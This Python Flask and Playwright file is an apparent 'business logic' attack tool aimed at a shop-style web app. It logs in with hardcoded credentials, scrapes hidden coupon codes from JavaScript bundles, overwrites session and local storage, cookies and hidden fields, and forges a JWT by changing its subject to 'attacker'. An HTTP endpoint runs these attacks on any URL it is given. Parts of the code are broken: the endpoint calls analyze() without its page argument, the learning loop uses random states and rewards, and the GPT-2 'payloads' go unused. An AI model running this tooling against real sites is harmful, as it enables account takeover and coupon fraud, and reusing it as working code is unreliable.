from flask import Flask, jsonify,request
from flask_cors import CORS
import csv

app = Flask(__name__)
CORS(app)

# AI
import time
import random
import json
import logging
import base64
import re
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
from database import FirestoreDB
from transformers import pipeline
import numpy as np
import requests

# Configure logging: logs will be saved to automation.log and printed to console.
logging.basicConfig(
    filename='automation.log',
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)

# def log_print(msg):
#     print(msg)
#     logging.info(msg)

# Store logs in memory (this will be sent to frontend)
log_buffer = []

def log_print(msg):
    """Write logs to both console and in-memory buffer."""
    print(msg)
    logging.info(msg)
    log_buffer.append(msg)  # Add log to buffer

# Use a generator to stream logs in real-time
def event_stream():
    """A generator function that streams logs to the frontend."""
    while True:
        if log_buffer:
            # Pop the first log entry
            log = log_buffer.pop(0)
            yield f"data: {log}\n\n"
        time.sleep(1)

# Load pre-trained NLP model for attack generation (transformers pipeline)
generator = pipeline('text-generation', model='gpt2')  # Using GPT-2 for contextual generation

class BusinessLogicTrainer:
    def __init__(self, base_url):
        self.db = FirestoreDB()
        self.base_url = base_url.rstrip("/")
        self.page_data = {}
        self.logged_in = False  # Track login state
        self.state_history = []  # Track session state history for RL
        self.initial_status = None  # Initialize the status
        self.actions = ["modify_session", "modify_local_storage", "modify_cookies", "click_button", "brute_force_login"]  # Added actions
        self.q_table = np.zeros((len(self.actions), 5))  # Example Q-table (5 states for simplicity)
        self.coupon_codes = {}

    def load_urls(self):
        """Load URLs dynamically from Firestore (`crawled_urls`)."""
        crawled_data = self.db.get_all_documents("crawled_urls")
        if not crawled_data:
            log_print("[❌] No URLs found in Firestore. Run `WebCrawler` first.")
            return []
        return [doc["url"] for doc in crawled_data.values()]

    def perform_login(self, page):
        """Perform login directly."""
        if self.logged_in:
            return

        log_print("[🔑] Logging in...")
        page.goto(f"{self.base_url}/#/login", wait_until="domcontentloaded")
        time.sleep(5)
        page.fill('input[name="email"]', "user@example.com")
        page.fill('input[name="password"]', "password123")
        page.click('button[type="submit"]')
        time.sleep(7)
        auth_token = page.evaluate(
            "() => window.localStorage.getItem('token') || window.sessionStorage.getItem('token')")
        if auth_token:
            log_print("[✅] Login successful")
            self.logged_in = True
        else:
            log_print("[❌] Login failed. Proceeding without authentication.")

    def extract_state(self, page):
        """Extract session and local storage state."""
        session_storage = page.evaluate(
            "() => { let s = {}; for (let i = 0; i < sessionStorage.length; i++) { let key = sessionStorage.key(i); s[key] = sessionStorage.getItem(key); } return s; }"
        )
        local_storage = page.evaluate(
            "() => { let s = {}; for (let i = 0; i < localStorage.length; i++) { let key = localStorage.key(i); s[key] = localStorage.getItem(key); } return s; }"
        )
        cookies = page.context.cookies()
        state = {"sessionStorage": session_storage, "localStorage": local_storage, "cookies": cookies}
        return state

    def generate_attack_string(self, variable_name):
        """Generate a unique attack string based on the variable name using NLP (AI)."""
        context = f"Generate an attack payload to modify the variable '{variable_name}'. Make sure the attack is unique."
        result = generator(context, max_length=50, num_return_sequences=1)
        attack_string = result[0]['generated_text']
        return attack_string

    def generate_random_attack_value(self):
        """Generate a random value (such as a number or string) for the attack."""
        return random.randint(1000, 9999)  # Random number for attack simulation

    def extract_coupon_codes(self):
        """Extract coupon codes from JavaScript files."""
        try:
            # Fetch the HTML content of the base URL
            resp = requests.get(self.base_url, timeout=10)
            if resp.status_code != 200:
                log_print(f"[⚠️] Could not retrieve base page: HTTP {resp.status_code}")
                return

            # Extract JavaScript file links from <script> tags
            scripts = re.findall(r'<script.*?src="([^"]+)".*?>', resp.text)
            log_print(f"[DEBUG] Found script tags: {scripts}")  # Log the found scripts

            if not scripts:
                log_print("[⚠️] No <script> tags found on base page.")
                return

            for script_url in scripts:
                if not script_url.endswith(".js"):
                    continue
                if script_url.startswith("/"):
                    script_url = self.base_url + script_url
                elif not script_url.startswith("http"):
                    script_url = f"{self.base_url}/{script_url}"

                # Log the script URL being processed
                log_print(f"[DEBUG] Fetching JavaScript from: {script_url}")
                self.parse_campaigns_in_js(script_url)

            log_print(f"[✅] Discovered coupon codes: {self.coupon_codes}")

        except requests.RequestException as e:
            log_print(f"[⚠️] Error extracting coupon codes: {e}")

    def parse_campaigns_in_js(self, js_url):
        """Parse coupon codes from the JS file."""
        try:
            r = requests.get(js_url, timeout=10)
            if r.status_code != 200:
                return False

            match = re.search(
                r"(this\.[a-zA-Z0-9_]*\s*=\s*\{(.*?)(discount|campaign).*?\})",
                r.text,
                re.DOTALL | re.IGNORECASE
            )

            if not match:
                return False

            block = match.group(0)
            pattern = r"([A-Z0-9]+)\s*:\s*\{\s*[^}]*discount\s*:\s*(\d+)[^}]*validOn\s*:\s*([\d.eE]+)"
            pattern_alt = r"([A-Z0-9]+)\s*:\s*\{\s*[^}]*validOn\s*:\s*([\d.eE]+)[^}]*discount\s*:\s*(\d+)"

            found = re.findall(pattern, block, re.DOTALL | re.IGNORECASE)
            if not found:
                found = re.findall(pattern_alt, block, re.DOTALL | re.IGNORECASE)
                found = [(code, disc, valid) for (code, valid, disc) in found]

            for code, discount, valid_on in found:
                try:
                    numeric_valid_on = float(valid_on)
                    self.coupon_codes[code] = {"validOn": numeric_valid_on, "discount": int(discount)}
                except ValueError:
                    pass

            return bool(self.coupon_codes)
        except requests.RequestException:
            return False

    def attack_session_variable(self, page, variable_name, value):
        """Modifies session storage to simulate an attack."""
        current_state = self.extract_state(page)
        log_print(f"[ATTACK] Initial State: {json.dumps(current_state, indent=2)}")

        attack_string = self.generate_attack_string(variable_name)
        log_print(f"[ATTACK] Generated attack string: {attack_string}")

        current_value = current_state["sessionStorage"].get(variable_name, "None")
        log_print(f"[ATTACK] Before attack - Variable '{variable_name}': {current_value}")

        page.evaluate(f"sessionStorage.setItem('{variable_name}', '{value}');")
        time.sleep(1)

        new_state = self.extract_state(page)
        new_value = new_state["sessionStorage"].get(variable_name, "None")
        log_print(f"[ATTACK] After attack - Variable '{variable_name}': {new_value}")

        return new_value, current_value

    def attack_local_storage(self, page, variable_name, value):
        """Modifies local storage to simulate an attack."""
        current_state = self.extract_state(page)
        log_print(f"[ATTACK] Initial State: {json.dumps(current_state, indent=2)}")

        attack_string = self.generate_attack_string(variable_name)
        log_print(f"[ATTACK] Generated attack string: {attack_string}")

        current_value = current_state["localStorage"].get(variable_name, "None")
        log_print(f"[ATTACK] Before attack - Variable '{variable_name}': {current_value}")

        page.evaluate(f"localStorage.setItem('{variable_name}', '{value}');")
        time.sleep(1)

        new_state = self.extract_state(page)
        new_value = new_state["localStorage"].get(variable_name, "None")
        log_print(f"[ATTACK] After attack - Variable '{variable_name}': {new_value}")

        return new_value, current_value

    def is_encrypted(self, value):
        """Detect if the given value is encrypted or encoded."""
        # Check if it looks like base64
        if len(value) % 4 == 0 and re.match(r'^[A-Za-z0-9+/=]+$', value):
            try:
                decoded_value = base64.b64decode(value).decode('utf-8')
                return True  # It's likely base64 encoded
            except:
                return False
        # Check for JWT pattern (3 parts separated by dots)
        if len(value.split('.')) == 3:
            return True  # Likely a JWT
        return False

    def attack_cookies(self, page, cookie_name, value):
        """Modifies cookies to simulate an attack."""
        current_state = self.extract_state(page)
        log_print(f"[ATTACK] Initial State: {json.dumps(current_state, indent=2)}")

        attack_string = self.generate_attack_string(cookie_name)
        log_print(f"[ATTACK] Generated attack string: {attack_string}")

        current_value = [cookie["value"] for cookie in current_state["cookies"] if cookie["name"] == cookie_name]
        log_print(f"[ATTACK] Before attack - Cookie '{cookie_name}': {current_value}")

        if cookie_name == "token":  # Example of handling an encrypted JWT token
            log_print("[ATTACK] token is encrypted. Attempting to exploit encryption.")

            # Check if the value looks like a JWT token
            try:
                parts = current_value[0].split(".")
                if len(parts) == 3:
                    # Decode the token
                    header = base64.urlsafe_b64decode(parts[0] + "==").decode("utf-8")
                    payload = base64.urlsafe_b64decode(parts[1] + "==").decode("utf-8")

                    log_print(f"[ATTACK] Decoded header: {header}")
                    log_print(f"[ATTACK] Decoded payload: {payload}")

                    # Modify the token payload (for simplicity, this is a dummy modification)
                    payload_dict = json.loads(payload)
                    payload_dict["sub"] = "attacker"  # Changing the user ID in the payload

                    # Re-encode the modified payload back into the JWT
                    new_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode("utf-8")).decode(
                        "utf-8").rstrip("=")
                    new_token = parts[0] + "." + new_payload + "." + parts[2]

                    # Set the modified token
                    page.context.add_cookies([{"name": cookie_name, "value": new_token, "url": self.base_url}])
                    time.sleep(1)
                    new_state = self.extract_state(page)
                    new_value = [cookie["value"] for cookie in new_state["cookies"] if cookie["name"] == cookie_name]
                    log_print(f"[ATTACK] After attack - Cookie '{cookie_name}': {new_value}")

            except Exception as e:
                log_print(f"[ATTACK] Failed to decode or modify JWT token: {e}")
                page.context.add_cookies([{"name": cookie_name, "value": value, "url": self.base_url}])
                time.sleep(1)

        else:
            # Non-encrypted cookie handling
            page.context.add_cookies([{"name": cookie_name, "value": value, "url": self.base_url}])
            time.sleep(1)

            new_state = self.extract_state(page)
            new_value = [cookie["value"] for cookie in new_state["cookies"] if cookie["name"] == cookie_name]
            log_print(f"[ATTACK] After attack - Cookie '{cookie_name}': {new_value}")

        return new_value, current_value

    def perform_attack_on_unique_variables(self, page, unique_variables):
        """Perform attack on extracted unique variables."""
        attack_results = []
        for variable, value in unique_variables.items():
            attack_value = self.generate_random_attack_value()  # Generate a random attack value for uniqueness
            log_print(f"[ATTACK] Attempting attack on '{variable}' with value '{attack_value}'")

            # Detect if the value is encrypted or not
            if self.is_encrypted(value):
                log_print(f"[ATTACK] {variable} is encrypted. Attempting to exploit encryption.")
                # Here, you would apply logic to exploit the encryption (JWT manipulation, brute-force decryption, etc.)
                attack_value = self.generate_random_attack_value()  # Placeholder for further attack logic

            # Determine if it's sessionStorage, localStorage, or cookies
            if variable in page.evaluate("Object.keys(window.sessionStorage)") :
                new_value, current_value = self.attack_session_variable(page, variable, attack_value)
            elif variable in page.evaluate("Object.keys(window.localStorage)") :
                new_value, current_value = self.attack_local_storage(page, variable, attack_value)
            else:
                # Assuming it's a cookie if it doesn't match sessionStorage or localStorage
                new_value, current_value = self.attack_cookies(page, variable, str(attack_value))

            # Log difference between before and after attack
            if new_value != current_value:
                log_print(f"[DIFFERENCE] Value of '{variable}' changed from '{current_value}' to '{new_value}'")

            attack_results.append((variable, attack_value, new_value != current_value))

        return attack_results

    def proof_of_attack_reliability(self, page, attack_results):
        """Check if the attack causes an actual change in the response (proof of reliability)."""
        log_print("[PROOF] Verifying if the attack caused a real change...")

        initial_content = page.content()
        for var, value, success in attack_results:
            if success:
                log_print(f"[PROOF] Attack on '{var}' succeeded. Checking for page response change...")
                page.reload()  # Reload to check for changes
                time.sleep(3)
                new_content = page.content()

                if initial_content != new_content:
                    log_print("[PROOF] Page content has changed. Attack is successful.")
                else:
                    log_print("[PROOF] No content change detected after attack.")

    def capture_status_code(self, response):
        """Capture the status code of the response and log it."""
        status_code = response.status()
        log_print(f"[STATUS] Status Code: {status_code}")
        if self.initial_status is None:
            self.initial_status = status_code

    def q_learning_update(self, state, action, reward, next_state):
        """Update Q-table using the Q-learning formula."""
        action_idx = self.actions.index(action)
        state_idx = random.randint(0, len(self.q_table)-1)
        next_state_idx = random.randint(0, len(self.q_table)-1)

        # Q-learning formula
        self.q_table[state_idx, action_idx] = self.q_table[state_idx, action_idx] + 0.1 * (
            reward + 0.9 * np.max(self.q_table[next_state_idx]) - self.q_table[state_idx, action_idx]
        )

    def extract_unique_variables(self, page):
        """Extract unique session/local storage variables and input elements (hidden)."""
        unique_variables = {}

        # Extract session and local storage variables
        session_storage = page.evaluate(
            "() => { let s = {}; for (let i = 0; i < sessionStorage.length; i++) { let key = sessionStorage.key(i); s[key] = sessionStorage.getItem(key); } return s; }"
        )
        local_storage = page.evaluate(
            "() => { let s = {}; for (let i = 0; i < localStorage.length; i++) { let key = localStorage.key(i); s[key] = localStorage.getItem(key); } return s; }"
        )

        # Add session and local storage variables to the dictionary
        unique_variables.update(session_storage)
        unique_variables.update(local_storage)

        # Extract hidden input fields from the page
        hidden_inputs = page.locator("input[type='hidden']")
        hidden_count = hidden_inputs.count()
        for i in range(hidden_count):
            element = hidden_inputs.nth(i)
            name = element.get_attribute("name")
            value = element.get_attribute("value")
            if name:
                unique_variables[name] = value

        return unique_variables

    def log_attack_results(self, page, attack_results):
        """Log detailed attack results."""
        state_before = self.extract_state(page)
        log_print(f"[STATE] State before attacks: {json.dumps(state_before, indent=2)}")

        for var, value, success in attack_results:
            log_print(f"[ATTACK] Attempted attack on '{var}' with value '{value}'")
            if success:
                log_print(f"[ATTACK SUCCESS] {var} successfully modified to {value}")
            else:
                log_print(f"[ATTACK FAILURE] Failed to modify {var} to {value}")

        state_after = self.extract_state(page)
        log_print(f"[STATE] State after attacks: {json.dumps(state_after, indent=2)}")

        # Compare before and after states
        if state_before != state_after:
            log_print("[STATE] Change detected in session storage or cookies.")
        else:
            log_print("[STATE] No change detected.")

    def wait_for_full_render(self, page):
        """Wait until page rendering stabilizes."""
        prev_html = ""
        for _ in range(10):
            time.sleep(1)
            current_html = page.content()
            if current_html == prev_html:
                log_print("[✅] Page fully loaded")
                break
            prev_html = current_html

    # def analyze(self, page):
    #     """Run the analysis and perform the attack simulation."""
    #     self.perform_login(page)
    #
    #     homepage = f"{self.base_url}/#/"
    #     log_print("Navigating to homepage: " + homepage)
    #     page.goto(homepage, wait_until="domcontentloaded")
    #     self.wait_for_full_render(page)
    #
    #     unique_variables = self.extract_unique_variables(page)  # Extract session, localStorage, and cookies
    #
    #     # Perform attack on sessionStorage, localStorage, and cookies
    #     attack_results = self.perform_attack_on_unique_variables(page, unique_variables)
    #     self.extract_coupon_codes()  # Extract coupon codes from JavaScript
    #
    #     # Here you can list the discovered coupon codes
    #     log_print(f"Discovered Coupon Codes: {self.coupon_codes}")
    #     self.log_attack_results(page, attack_results)
    #
    #     self.proof_of_attack_reliability(page, attack_results)
    #
    #     # RL learning
    #     state = self.extract_state(page)
    #     action = random.choice(self.actions)
    #     reward = random.choice([1, -1])  # Placeholder reward for now
    #     next_state = self.extract_state(page)
    #     self.q_learning_update(state, action, reward, next_state)

    def analyze(self, page):
        """Run the analysis and perform the attack simulation."""
        self.perform_login(page)

        homepage = f"{self.base_url}/#/home"
        log_print("Navigating to homepage: " + homepage)
        page.goto(homepage, wait_until="domcontentloaded")
        time.sleep(3)

        # Extract coupon codes from JavaScript files
        self.extract_coupon_codes()

        # List the discovered coupon codes
        log_print(f"Discovered Coupon Codes: {self.coupon_codes}")

        unique_variables = self.extract_unique_variables(page)  # Extract session, localStorage, and cookies

        # Perform attack on sessionStorage, localStorage, and cookies
        attack_results = self.perform_attack_on_unique_variables(page, unique_variables)
        self.log_attack_results(page, attack_results)

        # Check if the attack was successful
        self.proof_of_attack_reliability(page, attack_results)

        # Update Q-learning
        state = self.extract_state(page)
        action = random.choice(self.actions)
        reward = random.choice([1, -1])  # Placeholder reward for now
        next_state = self.extract_state(page)
        self.q_learning_update(state, action, reward, next_state)


if __name__ == "__main__":
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        page = browser.new_page()
        trainer = BusinessLogicTrainer("https://slaying.ddns.net")
        trainer.analyze(page)
        browser.close()

# ================


# Define business logic keywords
BUSINESS_LOGIC_KEYWORDS = ["authentication", "authorization", "business logic", "session", "validation", "modification"]

def read_and_filter_csv():
    filtered_data = []
    
    # Read CSV file
    with open("owasptop10cwe.csv", newline='', encoding='utf-8') as csvfile:
        reader = csv.DictReader(csvfile)

        # Ensure the required headers exist
        required_headers = {"Description", "Potential Mitigations"}
        if not required_headers.issubset(reader.fieldnames):
            raise ValueError("CSV file must contain 'Description' and 'Potential Mitigations' columns.")

        for row in reader:
            filtered_data.append(
                {
                    "name": row["Name"],
                    "description": row["Description"],
                    "potential_mitigations": row["Potential Mitigations"],
                    "is_business_logic": any(keyword in row["Description"].lower() for keyword in BUSINESS_LOGIC_KEYWORDS)
                }
            )
    return filtered_data

@app.route("/get_cwe_data", methods=["GET"])
def get_cwe_data():
    data = read_and_filter_csv()
    return jsonify(data)

@app.route("/start_attack", methods=["POST"])
def start_attack():
    url = request.json.get("url")
    if not url:
        return jsonify({"error": "No URL provided"}), 400

    # Initialize the BusinessLogicTrainer with the provided URL
    trainer = BusinessLogicTrainer(url)
    trainer.analyze()  # Run the attack simulation

    return jsonify({"log": f"Attack simulation completed for URL: {url}"})


#@app.route("/start_attack", methods=["GET"])
if __name__ == "__main__":
    app.run(debug=True)
